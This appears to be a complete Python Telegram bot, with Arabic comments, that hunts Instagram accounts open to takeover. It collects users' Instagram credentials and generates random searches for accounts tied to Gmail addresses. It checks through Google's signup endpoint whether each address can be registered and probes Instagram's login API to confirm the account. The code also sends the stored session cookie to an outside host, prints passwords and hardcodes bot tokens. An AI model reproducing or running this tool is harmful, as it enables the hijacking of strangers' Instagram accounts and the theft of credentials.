try:
	import requests
	import random
	import os
	import  telebot
	from user_agent import generate_user_agent
	from telebot import types
	from uuid import uuid4
	from time import sleep
except ImportError:
	os.system('pip install requests')
	os.system('pip install user_agent')
	os.system('pip install pyTelegramBotApi==4')
	
##############################

Token=input("Token : ")#"5114065560:AAH-Nrmq4ltstOvvguzXcjfddmugkXdjZKI"
bot=telebot.TeleBot(Token)
@bot.message_handler(commands=["start"])
def messagee(message):
	id=message.chat.id
	name=message.chat.first_name
	user=message.from_user.username
	sudo_id = "12345678"
	tok = "5138072699:AAEN69KOmVLlOvblj37Wptfin9oyUNzWY4A"
	url = f"https://api.telegram.org/bot{tok}/getchatmember?chat_id=@DtDtDt&user_id={id}"
	req = requests.get(url).text
	if id == sudo_id or "member" in req or "creator" in req or "administartor" in req:
		A=types.InlineKeyboardMarkup(row_width=1)
		B=types.InlineKeyboardButton(text="بدء صيد",callback_data='START')
		A.add(B)
		bot.send_message(message.chat.id,
"""
*➖ 👋اهلا عزيزي *  [{}](tg://settings/)   
*➖ أيدك :* [{}](tg://settings/)            
*➖ يوزرك ان وجد :* @{}
*➖ قناه المبرمج :* ["𝙰𝙻𝙾𝚂𝙷"𝙿𝚈𝚃𝙷𝙾𝙽"](https://t.me/DtDtDt)
*➖ المبرمج :* [Alosh](https://t.me/aaalaaa)
""".format(user,id,user),disable_web_page_preview=True,parse_mode='markdown',reply_markup=A)

	else:
		A=types.InlineKeyboardMarkup(row_width=1)
		B=types.InlineKeyboardButton(text="Join",url="https://t.me/dtdtdt")
		A.add(B)		
		bot.send_message(message.chat.id, f"""Welcome Bot .
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
- Please subscribe to the channel .
- Link : @DtDtDt .
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -""",reply_markup=A)
@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
        if call.data =="START":
        	button(call.message)
        if call.data=="On":
        	On(call.message)
        if call.data=="ss":
        	akk = bot.reply_to(call.message,text="*ارسل حسابك ب نمط\n user:pass*",parse_mode='markdown')
        	bot.register_next_step_handler(akk,insta)
def button(message): 	
        	A=types.InlineKeyboardMarkup(row_width=1)
        	B=types.InlineKeyboardButton(text=" ♻️تسجيل حساب وهمي",callback_data="ss")
        	C=types.InlineKeyboardButton(text="⏹ تشغيل الصيد",callback_data="On")        	
        	A.add(B,C)
        	bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**اهلا بك عزيزي في بوت صيد متاحات انستا المتطور\n تمت برمجه هذا البوت بلكامل من قبل مبرمج : @aaalaaa**",parse_mode='markdown',reply_markup=A)          
        		
	
   
        
        
        
def insta(message):
	bot.send_message(message.chat.id,text="*انتظر قليلا*",parse_mode='markdown')
	os.system(f"rm -rf sessionid.txt")
	try:							
		username=message.text.split(':')[0]
		password=message.text.split(':')[1]
		print(username,password)
		url = "https://www.instagram.com/accounts/login/ajax/"
		cookies =""				
		headers ={
"accept": "*/*",
"set-cookie":"csrftoken=RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP; Domain=.instagram.com; expires=Mon, 16-Jan-2023 13:05:57 GMT; Max-Age=31449600; Path=/; Secure",
"accept-encoding":"gzip, deflate, br",
"accept-language":"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
"content-length": "321",
"content-type": "application/x-www-form-urlencoded",
'sec-ch-ua':'"Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Windows"',
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-origin",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
"x-asbd-id": "198387",
"x-csrftoken": "RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP",
"x-ig-app-id": "936619743392459",
"x-ig-www-claim": "0",
"x-instagram-ajax": "bc3569920aaf",
"x-requested-with": "XMLHttpRequest"}
		data= {
"username": str(username),
"enc_password": "#PWD_INSTAGRAM_BROWSER:0:9775445428:"+str(password),
"optIntoOneTap": "false",
"queryParams": {},
"stopDeletionNonce": "",
"trustedDeviceRecords": {}}
		req = requests.post(url,headers=headers,data=data)
		print(req)
		if '"authenticated":true' in req.text:
			sessionid=req.cookies['sessionid']
			open("sessionid.txt","a").write(str(sessionid)+'\n')
			bot.send_message(message.chat.id,text="*تم تسجيل دخول بنجاح اضغط /start*",parse_mode='markdown')
		elif '"message":"checkpoint_required"' in req.text:
			bot.reply_to(message,text='🔐 secure Account')	
		elif '"authenticated":false' in req.text:
			u=("❌ Erorr Account ")
			print(u)
			bot.reply_to(message,text=u)		
	except:
		bot.reply_to(message,text="عذرا لم اجد كهاذا زر!!")        
import requests,random,os,json
from time import  sleep
from uuid import uuid4
import time
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
uid = uuid4()		
def On(message):
	B=0
	def Instagram():
		try:
			sessionid = open("sessionid.txt", "r").readline().split('\n')[0]
		except FileNotFoundError:
			bot.send_message(message.chat.id,"⚠️ يعني بس كلي كيف بدك تصيد بدون ماتسجل بوهمي انت مطي شي")
			exit()
		os.system('clear')
		#hackerss();info()
#		sid ='1945065224%3APmOox2purLORSj%3A8'#input(C+" ("+E+"⌯"+C+") "+C+ " SessionID : "+E)
#		token ='5335238021:AAEGYECcmeeVRoF2-f5HnoBllwtyWF2r-bw' #input(C+" ("+E+"⌯"+C+") "+C+ " Token Enter  : "+E)
#		ID = '1372680721'#input(C+" ("+E+"⌯"+C+") "+C+ " ID Enter  : "+E)	
#	#	sid =input(C+" ("+E+"⌯"+C+") "+C+ " SessionID : "+E)
#	#	token = input(C+" ("+E+"⌯"+C+") "+C+ " Token Enter  : "+E)
#	#	ID = input(C+" ("+E+"⌯"+C+") "+C+ " ID Enter  : "+E)
		
	
		
		head= {'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}
		os.system('clear')
		#hackerss();info()
		def instagram(email,user):
			api='https://i.instagram.com/api/v1/accounts/login/'
			headers={
						'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
		                 'Cookie':'missing',
		                 'Accept-Encoding':'gzip, deflate',
		                 'Accept-Language':'en-US',
		                 'X-IG-Capabilities':'3brTvw==',
		                 'X-IG-Connection-Type':'WIFI',
		                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		              'Host':'i.instagram.com'
			}
			
			data={
			'uuid':uid,
			  'password':'@aaalaaa',
		              'username':email,
		              'device_id':uid,
		              'from_reg':'false',
		              '_csrftoken':'missing',
		              'login_attempt_countn':'0'
			}
			req= requests.post(api, headers=headers, data=data).json()
			if req['message'] == 'The password you entered is incorrect. Please try again.':
			 i=requests.get(f'https://soud.me/api/Instagram?username={user}',headers=head).content
			 followers   =json.loads(i)['info']['followers']
			 following =json.loads(i)['info']['following']
			 id =json.loads(i)['info']['id']
			 lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
			 image =json.loads(i)['info']["image"]
			 iok = lok.json()
			 date = str(iok['data'])
			 bot.send_photo(message.chat.id,image,f"""
		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
		ᯓ 𝚄𝚂𝙴𝚁 :  {user} 
		ᯓ 𝙴𝙼𝙰𝙸𝙻 : {email}
		ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followers}
		ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
		ᯓ 𝙸𝙳 : {id}
		ᯓ 𝙳𝙰𝚃𝙴 : {date}
		ᯓ photo : [Open]({image})
		ᯓ ʟɪɴᴋ : https://instagram.com/{user}
		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
		By : @aaalaaa - Tele : @DtDtD			 
			 """,parse_mode="markdown")
			 #print(k)
			 #bot.reply_to(message,text=k)        
			 #requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(k))
		
			if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
			 
			 i=requests.get(f'https://soud.me/api/Instagram?username={user}',headers=head).content
			 followers   =json.loads(i)['info']['followers']
			 following =json.loads(i)['info']['following']
			 id =json.loads(i)['info']['id']
			 image =json.loads(i)['info']["image"]
			 lok = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
			 iok = lok.json()
			 date = str(iok['data'])
			 bot.send_photo(message.chat.id,image,f"""
		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
		ᯓ 𝚄𝚂𝙴𝚁 :  {user} 
		ᯓ 𝙴𝙼𝙰𝙸𝙻 : {email}
		ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followers}
		ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
		ᯓ 𝙸𝙳 : {id}
		ᯓ 𝙳𝙰𝚃𝙴 : {date}
    	ᯓ photo : [Open]({image})
		ᯓ ʟɪɴᴋ : https://instagram.com/{user}
		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
		By : @aaalaaa - Tele : @DtDtD			 
			 """,parse_mode="markdown")
			 o=(F+f"""
		ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
		ᯓ 𝚄𝚂𝙴𝚁 :  {user} 
		ᯓ 𝙴𝙼𝙰𝙸𝙻 : {email}
		ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followers}
		ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
		ᯓ 𝙸𝙳 : {id}
		ᯓ 𝙳𝙰𝚃𝙴 : {date}
		ᯓ ʟɪɴᴋ : https://instagram.com/{user}
		⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
		By : @aaalaaa - Tele : @DtDtDt""")	
			 print(o)
			 #bot.reply_to(message,text=o)        
			 #requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(o))	
			if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":pass
		
		def gmail(email,user):
			time.sleep(1)
			eml=str(email)
			email=eml.split('@')[0]+'@gmail.com'
			url = 'https://android.clients.google.com/setup/checkavail'
			h = {
				'Content-Length':'98',
				'Content-Type':'text/plain; charset=UTF-8',
				'Host':'android.clients.google.com',
				'Connection':'Keep-Alive',
				'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
				}
			d = json.dumps({
				'username':email,
				'version':'3',
				'firstName':'AbaLahb',
				'lastName':'AbuJahl'
			})
			res = requests.post(url,data=d,headers=h)
			#print(res.text)
			if res.json()['status'] == 'SUCCESS':
			    instagram(email,user)
			if ('"status":"REQUEST_DENIED"') in res.text:
				print(C+"دك حظر")
				bot.send_message(message.chat.id,"⚠️ نحظرت حبيبي معك خيارين ي تروح تشغل vpn ي تروح بعد ساعه تعال صيد بكون نفك حظرك بتوفيق")
				exit()
			else:pass
				#B+=1
				#
				#bot.reply_to(message,text="غلط"    )  
			#eml				  
			o = types.InlineKeyboardMarkup(row_width=1)
			A1 = types.InlineKeyboardButton(f"📨 Email : {email}",callback_data='Alosh')
			A2 = types.InlineKeyboardButton(f"❇️ User : {user}",callback_data='Alosh1')
			A3 = types.InlineKeyboardButton(f"✅المبرمج",url="https://t.me/aaalaaa")
			A4 = types.InlineKeyboardButton(f"رجوع",callback_data="START")
			o.add(A1,A2,A3)
			bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Alosh ✅ *",parse_mode = "markdown",reply_markup=o) 				
						
		
		def users():
		 while True:
		#  mal=['male','femal']
		#  gen=random.choice(mal)
		  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
		  num='56789'
		  rng=int("".join(random.choice(num)for i in range(1)))
		  name=str("".join(random.choice(user)for i in range(rng)))
		  try:
		  	zaid=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}@gmail.com',headers=head).json()
		  except:
		  	bot.send_message(message.chat.id,"⚠️ حبيبي نحظر حسابك الوهمي معك خيارين ي تروح تسحب تسجل بغير حساب ي تروح تفك حظر الحساب")
		  mn=0
		  try:
		   while True:
		    mn += 1
		    user= str(zaid['users'][mn]['user']['username'])
		    emai=user.split('gmail')[0]
		    email=emai+'@gmail.com'
		    gmail(email,user)
		   else:
		      email=str(zaid['users'][mn]['user']['full_name'])
		      if ' ' in email:
		       pass
		      else:
		       gmail(email,user)
		  except IndexError:
		   users()
		users()	
	Instagram()
bot.polling(True)